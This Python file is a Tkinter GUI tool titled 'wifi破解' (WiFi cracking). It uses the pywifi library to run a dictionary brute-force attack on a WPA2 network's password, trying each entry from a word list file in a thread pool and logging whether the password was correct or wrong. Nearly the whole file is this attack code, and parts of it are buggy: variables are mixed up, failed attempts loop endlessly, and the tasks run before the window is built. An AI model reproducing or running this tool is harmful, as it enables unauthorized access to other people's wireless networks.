try:
    from tkinter import *
except ImportError:  # Python 2.x
    PythonVersion = 2
    from Tkinter import *
    from tkFont import Font
    from ttk import *
    from tkMessageBox import *
    import tkFileDialog
else:  # Python 3.x
    PythonVersion = 3
    from tkinter.font import Font
    from tkinter.ttk import *
    from tkinter.messagebox import *
from pywifi import const
import pywifi
import time, os, threading
from concurrent.futures import ThreadPoolExecutor


def wificonnect(mm_str, wifiname):
    wifi = pywifi.PyWiFi()
    # 选择网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有WiFi
    ifaces.disconnect()
    time.sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # wifi名称
        profile.ssid = wifiname
        # 加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # wifi的密码
        profile.key = mm_str
        # 网卡开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # 删除所有的WiFi连接文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        # 连接WiFi
        ifaces.connect(tep_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已经连接")


# 读取密码
def readPwd(str):
    wifiname = entry.get()
    # print(wifiname)
    # path = r'.\\破解\\wifi\\wifipwd.txt'
    # file = open(path, 'r')
    while True:
        try:
            # print(myStr)
            bool = wificonnect(str, wifiname)
            if bool:
                # print("密码正确",myStr)
                # 添加到最后
                text.insert(END, "密码正确" + myStr)
                break
            else:
                # print("密码错误",myStr)
                # 添加到最后
                text.insert(END, "密码错误" + myStr)
                # 文本往下滚动
                text.see(END)
                # 刷新
                text.update()
        except:
            continue


path = r'wifipwd.txt'
with open(path, 'r') as file:
    # myStr = file.readlines()
    # print(myStr)
    myStr = [x.strip() for x in file.readlines() if x.strip() != ""]
    # print(myStr)
# 1.创建线程池
pool = ThreadPoolExecutor(max_workers=3)
# 循环指派任务
# 2.指定对应任务和参数
[pool.submit(readPwd, i) for i in myStr]
# 3.关闭线程池
pool.shutdown()

# 创建窗口
root = Tk()
# 窗口标题
root.title('wifi破解')
# 窗口大小# 窗口位置
root.geometry('500x400+550+260')
# 标签控件# 位置定位
label = Label(root, text="请输入要破解的WiFi：", font=('微软雅黑', 12)).grid(
    row=0, column=0
)

# 输入控件
entry = Entry(root, font=('微软雅黑', 22))
entry.grid(row=0, column=1)

# 列表框控件
text = Listbox(
    root, font=('微软雅黑', 15), width=40, height=10)
text.grid(row=1, columnspan=2)

# 按钮
button = Button(root, text='开始破解', width=20, command=readPwd).grid(
    row=2, columnspan=2
)
# 显示窗口
root.mainloop()
